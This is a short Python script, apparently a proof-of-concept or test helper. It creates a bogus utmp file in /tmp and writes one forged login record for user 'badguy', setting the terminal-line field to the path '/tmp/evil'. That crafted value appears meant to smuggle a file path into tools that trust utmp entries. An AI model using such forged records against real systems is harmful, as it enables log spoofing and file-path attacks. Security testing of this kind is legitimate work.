#!/usr/bin/python
# python utmp doesn't work on all releases
import utmp
from UTMPCONST import USER_PROCESS
# "touch"
file('/tmp/utmp.bogus', 'w').close()
# add record...
a = utmp.UtmpRecord('/tmp/utmp.bogus')
b = utmp.UtmpEntry()
b.ut_type = USER_PROCESS
b.ut_pid = 10000
b.ut_user = "badguy"
b.ut_line = '/tmp/evil'
b.ut_host = 'localhost'
b.ut_tv = (0, 0)
a.pututline(b)
